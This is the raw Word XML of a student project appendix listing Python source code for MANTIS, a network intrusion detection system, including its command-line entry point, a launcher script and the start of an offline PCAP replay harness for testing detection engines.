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7C4B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b/>
          <w:sz w:val="56"/>
        </w:rPr>
        <w:t>MANTIS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A3EFF7F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32"/>
        </w:rPr>
        <w:t>Minimalist Alert Network for Threat Intelligence System</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DDC7219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b/>
          <w:sz w:val="40"/>
        </w:rPr>
        <w:t>Source Code Listings</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D11DD15" w14:textId="77777777" w:rsidR="00CF0850" w:rsidRPr="00B15925" w:rsidRDefault="00CF0850">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="215B4AB8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26"/>
        </w:rPr>
        <w:t>Anuskar Sigdel - 24812606</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="464E3163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26"/>
        </w:rPr>
        <w:t>BSc (Hons) Computing</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40C973D0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26"/>
        </w:rPr>
        <w:t>University of Northampton</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B6CCC08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26"/>
        </w:rPr>
        <w:t>Supervisor: Nischal Khadka</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67DBFDBC" w14:textId="77777777" w:rsidR="00CF0850" w:rsidRPr="00B15925" w:rsidRDefault="00000000">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B15925">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>August 2026</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DA2034A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</w:rPr>
        <w:t>This document lists the complete MANTIS source code as submitted. The implementation uses only the Python 3 standard library; Linux provides AF_PACKET capture, libcap capabilities and iptables enforcement. Code is grouped by package in the order the architecture chapters describe: entry points, sensor node, detection engines, training, evaluation, dashboard and SIEM, utilities, the automated test suite and the shell scripts.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B652099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</w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="01A06B06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lastRenderedPageBreak/>
        <w:t>Entry Points and Orchestration</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="023665B4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src/main.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BE8576C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(222 lines)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B6EB5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0146B8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argparse</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="112DE5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28BFA2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queue</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AD2E2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673F5C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04D429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5A4051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0968F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01C4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dashboard_ui.dashboard as dashboard</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DD62B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sensor_node.sensor as sensor</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C5C1E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utils.config import CONFIG</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="051AA1C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BDB7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3DF8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parse_args(argv=None):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A8318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argparse.ArgumentParser(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="324FCB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prog="mantis",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A3088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description="MANTIS - Minimalist Alert Network for Threat "</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72F75C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"Intelligence System",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16A212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epilog="Active defence is OFF unless --block is given (NFR-3).")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62AC7B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188C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p.add_argument("--remote", default=None,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EC296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help="dashboard server IP (distributed mode)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A2712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p.add_argument("--port", type=int, default=None,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77FC66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help="udp telemetry port (default 9999)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28E2EB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p.add_argument("--mode", choices=["cli", "web"], default=None,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2475D4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help="skip the interactive prompt and pick a UI")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="576822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p.add_argument("--config", default=None,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50FABD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help="json config file to load")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E4772F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1146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detection tuning ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FC739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p.add_argument("--zscore-threshold", type=float, default=None,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48F7EF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help="z-score alert threshold (default 3.0)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AB579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p.add_argument("--zscore-window", type=int, default=None,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F0810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help="rolling baseline window in seconds (default 30)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0368E2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p.add_argument("--ddos-min-pps", type=int, default=None,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69B8E3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help="minimum packet rate eligible for DDoS (default 500)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7500B1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p.add_argument("--ddos-consecutive",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36AC80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dest="ddos_consecutive_intervals",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12B777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type=int, default=None,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2370AB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help="consecutive anomalous seconds required (default 3)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34729E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p.add_argument("--knn-k", type=int, default=None, help="KNN neighbours")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C3305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p.add_argument("--alert-dedup-seconds", type=float, default=None,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C574E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help="suppress identical alerts for this long (default 5)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C6583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p.add_argument("--source-attribution-min-share", type=float, default=None,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D85BB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help="minimum dominant-source traffic share required to "</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E7362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"attribute interval alerts (default 0.50)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B9D047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C090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response (NFR-3: opt-in) ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="438037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p.add_argument("--block", dest="block_enabled", action="store_true",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28E3F5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default=None,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C4B6F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help="ENABLE iptables blocking (off by default)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04F3FE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p.add_argument("--block-on", default=None,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F687B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help="comma list of kinds that may trigger a block "</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="064EE7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"(payload,blacklist,ddos,scan)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C1411F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02CD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privacy (NFR-3 / GDPR) ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B8E04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p.add_argument("--no-privacy", dest="privacy_mode", action="store_false",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="624E17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default=None, help="disable PII redaction in logs")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68DE0F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p.add_argument("--anonymise-ips", dest="anonymise_ips",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A0B05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action="store_true", default=None,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03D67A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help="mask the last octet of IPs in persisted logs")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="563642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p.add_argument("--payload-excerpt-bytes", type=int, default=None,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A9259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help="payload excerpt limit in bytes (default 64)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B7E7C9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7EE2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forensics ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04B50E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p.add_argument("--pcap-file", default=None,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30FC5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help="write a live libpcap capture (opens in Wireshark)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C4524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p.add_argument("--pcap-snaplen", type=int, default=None,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="639442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help="bytes captured per frame (default 96, headers only)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49BC39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p.add_argument("--blacklist-file", default=None,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54FC8C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help="threat-intel IP feed, one indicator per line")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77963E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p.add_argument("--log-file", default=None, help="csv audit log path")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59DCCB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p.add_argument("--packet-buffer", type=int, default=None,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06803D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 help="in-memory packet ring buffer size (default 5000)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00CA8B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4B52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p.parse_args(argv)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6596FEA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B555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A44F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BANNER = r"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="519054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__  ___ ___   _   _  _____  ___   ____</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="290920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/  |/  //   | / | / /|_   _|/ _ \ / ___|</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E31E3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/ /|_/ // /| |/  |/ /   | | | | | |\___ \</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AFC82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/ /  / // ___ / /|  /    | | | |_| | ___) |</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04335B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/_/  /_//_/  |_/_/ |_/    |_|  \___/ |____/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="415872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Minimalist Alert Network for Threat Intelligence System</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="793E8E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6FE1FD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CD33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2A9B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has_raw_capture_access():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FAB03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"""Return True when this process can open the Linux capture socket.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EC042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C4F7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Root is not the only valid case: install.sh can grant CAP_NET_RAW to the</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F5DAD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Python interpreter, so a non-root `mantis` process may be fully authorised.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67E3DC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Probing the actual socket keeps both `mantis` and `sudo mantis` honest.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B8402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0266D2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hasattr(socket, "AF_PACKET"):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DB6BD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26914E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probe = None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F81CF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220EB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probe = socket.socket(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="296840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socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F7921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0506E1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(PermissionError, OSError):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7403CA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5071D7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finally:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A673D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probe is not None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25A871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probe.close()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A1F6E2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D1542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9697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main(argv=None):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="633014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args = parse_args(argv)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="469A80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has_raw_capture_access():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3049E0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raw packet capture is unavailable")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D3382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 run with sudo, or install capabilities using sudo ./install.sh")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C2423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 offline alternative:")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7176B6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   python3 replay.py --generate demo.pcap")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7248A5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   python3 replay.py --pcap demo.pcap")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6811C5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1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CD90B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print(BANNER)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DA8CF7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2CBC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config precedence: defaults -&gt; file -&gt; environment -&gt; cli flags</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F5064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args.config:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A3C33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CONFIG.load_file(args.config)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="629D4F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CONFIG.load_env()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48004C5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7CF0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args.port is not None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A1141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CONFIG.udp_port = args.port</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="730F14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args.block_on:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="249824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CONFIG.block_on = [k.strip() for k in args.block_on.split(",")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BC600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if k.strip()]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76142E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key in ("zscore_threshold", "zscore_window", "ddos_min_pps",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F4346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"ddos_consecutive_intervals", "knn_k", "block_enabled",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52FB51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"alert_dedup_seconds",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E6564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"source_attribution_min_share",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62CEE9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"privacy_mode", "anonymise_ips", "payload_excerpt_bytes",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36DC39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"pcap_file", "pcap_snaplen", "blacklist_file", "log_file",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39A922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"packet_buffer"):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28A923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value = getattr(args, key, None)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BCDAB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value is not None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C273E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setattr(CONFIG, key, value)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28A02F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42D8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args.mode:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33894B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op_mode = args.mode.upper()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="352ADE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48A8F2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print("Mode: 1) CLI dashboard   2) Web dashboard (port %d)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="146968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CONFIG.http_port)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AC907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choice = input("Choice [1/2] (default 1): ").strip()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D391D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op_mode = "WEB" if choice == "2" else "CLI"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="131EDF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70A5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CONFIG.block_enabled:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5681CA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ACTIVE DEFENCE ENABLED - iptables DROP rules will be "</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C3F5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"inserted for: %s" % ", ".join(CONFIG.block_on))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33F0B8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34D4B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active defence disabled (pass --block to enable)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="606961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E081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stats_q = queue.Queue()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50CFF3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alert_q = queue.Queue()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54B4B5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A3A6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ui = None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="283CFC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forward_alerts = False</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46A259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5C14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op_mode == "CLI":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30882B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ui = dashboard.Dashboard()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73083C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args.remote:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E13DA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CONFIG.udp_host = args.remote</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AA7CB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forward_alerts = True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="122EEF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distributed mode -&gt; %s:%d"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DA64F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(CONFIG.udp_host, CONFIG.udp_port))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6056DA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7F15A2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dashboard_ui.siem as siem</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C09C3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threading.Thread(target=siem.start_siem, daemon=True).start()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D9097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web dashboard: http://127.0.0.1:%d" % CONFIG.http_port)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F0CCA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CONFIG.udp_host = args.remote or "127.0.0.1"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38C6E4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forward_alerts = True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="413209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time.sleep(1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37A1CE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7749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the sensor now owns the audit log, telemetry and response policy via its</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C426A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AlertDispatcher, so this loop only has to drive the UI</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AE979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threading.Thread(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69F8A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target=sensor.start_sensor,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02D6AB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kwargs={"stats_queue": stats_q, "alert_queue": alert_q,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0086F0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"config": CONFIG, "forward_alerts": forward_alerts},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53BDF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daemon=True,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A8F06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).start()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BF6AD2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5DD9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6877B5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True:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5379E6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latest = None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="068DC7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while not stats_q.empty():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0834CA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6C3BCC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latest = stats_q.get_nowait()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D221D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queue.Empty:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30DD20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break</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E3E4E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latest and ui:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="274AD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ui.update_stats(latest["pps"], latest["mean"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DF29E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latest["z_score"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FA889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latest.get("ddos_candidate", False),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FA007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latest.get("ddos_active", False))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19398E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19B6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while not alert_q.empty():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="056806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02BB0C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msg = alert_q.get_nowait()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CD50D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queue.Empty:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="746141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break</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="520C3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ui:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AB228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ui.add_alert(msg)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FD1A5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D01D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ui:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="330E48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ui.refresh()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46100A2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626F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10 small sleeps so ctrl+c reacts quickly</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B5C92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_ in range(10):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="797DCA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time.sleep(0.1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69CA49E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82D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KeyboardInterrupt:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07576D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print("\n[!] shutting down")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40192C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0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20CCD94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B779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C259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4DF24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5F95DD4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src/mantis.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13576A2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(53 lines)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B8F2C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5EA4A9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6E0747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subprocess</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="284356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3A4B16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BABE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print_banner():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="303CC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print("==================================================")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26A35B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M.A.N.T.I.S. (Minimalist Alert Network for Threat Intelligence System) ")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63F80E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print("==================================================")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E4BD9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E319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def main():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="695256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print_banner()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16CBE9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print("[*] MANTIS Setup Wrapper")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27BD23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E1877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choice = input("[?] Run MANTIS in (L)ocal standalone mode or (R)emote mode? [L/R]: ").strip().upper()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BB4A2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BC759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choice == 'R':</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39B60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siem_ip = input("[?] Enter the central SIEM Server IP address (e.g. 192.168.1.50): ").strip()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="187EC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print(f"[*] Starting MANTIS in Remote Mode. Logs will be forwarded to {siem_ip}:9999")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52A40D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In the future (Phase 5), we will pass the siem_ip to sensor.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AB55F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subprocess.Popen(["sudo", "python3", "sensor_node/sensor.py", "--siem", siem_ip])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B143D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Remote Mode initialization complete! (Engines pending Phase 1-4 completion)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="729189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544388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elif choice == 'L':</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DCCC3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Starting MANTIS in Local Mode...")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="736D32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3F313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1. Start the SIEM Dashboard</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F1E8C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2055A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Launching SIEM Dashboard...")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12725B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siem_process = subprocess.Popen(["python3", "dashboard_ui/siem.py"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4834EF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time.sleep(2) # Give it a moment to boot</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31CECC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65871F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2. Start the Sensor (Phase 1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BBF92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Launching MANTIS Sensor (Requires Root)...")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F59F7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sensor_process = subprocess.Popen(["sudo", "python3", "sensor_node/sensor.py"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="497676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60A36B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print("[+] MANTIS is currently running locally! Press Ctrl+C to terminate.")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="784E26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6932EA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Keep alive until user stops</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="614D9A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siem_process.wait()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7939A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sensor_process.wait()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34CF61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12D00B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KeyboardInterrupt:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="525946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print("\n[!] Shutting down MANTIS systems...")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45E7AC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siem_process.terminate()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63C55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'sensor_process' in locals():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24EA70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subprocess.Popen(["sudo", "pkill", "-f", "sensor_node/sensor.py"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50F550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sys.exit(0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E1EC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2E3AE0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Invalid choice. Please run again and select L or R.")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23C408F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998E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47E989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main()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6556F007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src/replay.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="534335DA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(379 lines)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5475C8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45AB33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"""Offline PCAP replay harness for MANTIS.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53F2D0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3C5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Chapter 3 commits to evaluating the sensor with "offline PCAP replays" in</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17496A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addition to live-fire testing. This tool provides that path: it reads a</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="768518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capture file and pushes every frame through the *same* PacketParser and the</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B10F5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*same* five detection engines the live sensor uses, then reports which engines</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04998B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fired.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="117BEA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D765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Why this matters for the evaluation:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="375D08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2201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Reproducibility - a live `hping3` flood is never twice the same, so</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E95F3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metrics taken from it cannot be re-derived by a marker. Replaying a fixed</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="199814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capture yields byte-identical results on every run.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A4AD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No privileges - replay needs no root, no raw socket and no attack</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="257229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traffic, so the detection pipeline can be demonstrated and marked on any</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27A1E5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machine, including one where AF_PACKET is unavailable.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08EF71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Falsifiability - the capture can be opened independently in Wireshark to</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64F014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confirm that the traffic really contains what MANTIS claims it detected.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="695D13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B410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Two modes:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40D81F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4909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--generate FILE   synthesise a labelled attack scenario capture</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12F71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--pcap FILE       replay a capture through the engines and report</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C1328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1152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11A57F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150991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14A8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argparse</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52828F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75C7B3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094326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struct</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="701745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47E12A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import time</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2419CF7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39BB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7AD2C7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HERE not in sys.path:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="033478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HERE)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EEDF1C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6100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engines.bloom as bloom</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="794E38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engines.kmeans as kmeans</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48D834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engines.knn as knn</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29527B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engines.naive_bayes as naive_bayes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C5777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engines.z_score as z_score</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="229A9D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sensor_node.parser as parser_mod</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20A69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utils.mitre as mitre</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="317597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0741E8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utils.config import CONFIG</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0692E8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F14CF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2323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--------------------------------------------------------------------------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F1602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scenario generator</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A66EA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--------------------------------------------------------------------------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="694037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generate_scenario(path, blacklist_ip="10.0.0.66"):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F9755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"""Write a synthetic capture containing four distinct attack phases.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BC278F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A7E5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phases are chosen so that each detection engine has something to find,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A2831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which makes the replay a single-command demonstration of the whole</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="431246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ensemble:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F2FE7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C547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phase 1  baseline browsing      -&gt; no alert (specificity check)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A5A87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phase 2  horizontal port scan   -&gt; KNN</w:t>
